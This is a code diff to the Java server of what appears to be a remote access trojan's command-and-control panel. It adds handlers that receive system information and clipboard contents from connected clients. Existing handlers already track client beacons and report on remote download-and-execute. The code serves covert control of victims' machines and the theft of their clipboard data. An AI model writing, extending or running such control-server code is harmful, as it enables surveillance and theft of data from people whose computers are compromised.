@@ -2,9 +2,7 @@ package Server;
 
 import GUI.Components.FileContextMenu;
 import GUI.Controller;
-import GUI.Views.DownloadAndExecuteView;
-import GUI.Views.FileExplorerView;
-import GUI.Views.SendCommandView;
+import GUI.Views.*;
 import Logger.Level;
 import Logger.Logger;
 import Server.Data.PseudoBase;
@@ -95,6 +93,10 @@ class ProcessCommands implements Repository {
                 Controller.updateTable();
                 client.getClient().close();
                 break;
+            } else if (input.contains("SYINFO")){
+                String data = dis.readUTF();
+                Logger.log(Level.INFO, "SYSINFO: \n" + data);
+                SysInfoView.getArea().appendText(data);
             } else if (input.contains("BEACON")) {
                 client.setOnlineStatus("Online");
             } else if (input.contains("DAE")){
@@ -109,6 +111,11 @@ class ProcessCommands implements Repository {
                     DownloadAndExecuteView.setStatusLabel("Execution successful");
                 }
 
+            }
+
+            /** clipboard stuff **/
+            else if (input.contains("CLIPGET")){
+                GetClipboardView.getData().appendText("Clipboard data: " + dis.readUTF());
             }
         }
     }
